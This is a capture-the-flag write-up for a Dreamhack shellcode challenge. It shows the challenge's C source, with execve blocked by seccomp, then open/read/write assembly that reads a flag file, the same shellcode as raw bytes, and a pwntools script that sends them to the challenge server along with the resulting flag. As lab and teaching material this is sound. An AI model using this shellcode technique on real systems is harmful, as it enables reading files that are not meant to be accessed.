### Overview
In this challenge, we can not use function `execve` and `execveat` by this line in the source cose:
```c
void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}

```

The goal is open, read, and write the flag in `/home/shell_basic/flag_name_is_loooooong` using shellcode. 

### Exploitation
First, we need to convert the flag filename in little-edian by the following way:
```py
flag = "/home/shell_basic/flag_name_is_loooooong"
flag = flag[::-1].encode().hex()
blocks = [flag[i:i+16] for i in range(0, len(flag), 16)]
blocks = ['676e6f6f6f6f6f6f', '6c5f73695f656d61', '6e5f67616c662f63', '697361625f6c6c65', '68732f656d6f682f']

```

After that, we will create shellcode to open read and write flag file:

````asm
;push file flag onto stack
push   0x0
movabs rax, 0x676e6f6f6f6f6f6f
push   rax
movabs rax, 0x6c5f73695f656d61
push   rax
movabs rax, 0x6e5f67616c662f63
push   rax
movabs rax, 0x697361625f6c6c65
push   rax
movabs rax, 0x68732f656d6f682f
;open file
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov eax, 0x2
syscall
; read file
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov edx, 0x30
mov eax, 0x0
syscall
; write file
mov edi, 0x1
mov eax, 0x1
syscall
; close
mov eax, 0x3c
mov edi, 0x0
syscall
````

Send this shell code by pwntools in python and get flag:
```py
from pwn import *

p=remote('host3.dreamhack.games', 8609)
shellcode = b"\x6A\x00\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6E\x67\x50\x48\xB8\x61\x6D\x65\x5F\x69\x73\x5F\x6C\x50\x48\xB8\x63\x2F\x66\x6C\x61\x67\x5F\x6E\x50\x48\xB8\x65\x6C\x6C\x5F\x62\x61\x73\x69\x50\x48\xB8\x2F\x68\x6F\x6D\x65\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB8\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x30\xBA\x30\x00\x00\x00\xB8\x00\x00\x00\x00\x0F\x05\xBF\x01\x00\x00\x00\xB8\x01\x00\x00\x00\x0F\x05\xB8\x3C\x00\x00\x00\xBF\x00\x00\x00\x00\x0F\x05"
p.recvuntil("shellcode: ")
p.sendline(shellcode)
p.interactive()
```
Result:

```
khanh@ubuntu:~/Documents/PWN-dreamhack/shellcode$ python3 shell.py 
[q] Opening connection to host3.dreamhack.games on port 8609: Trying [+] Opening connection to host3.dreamhack.games on port 8609: Done
/home/khanh/Documents/PWN-dreamhack/shellcode/shell.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("shellcode: ")
[*] Switching to interactive mode
DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$  

```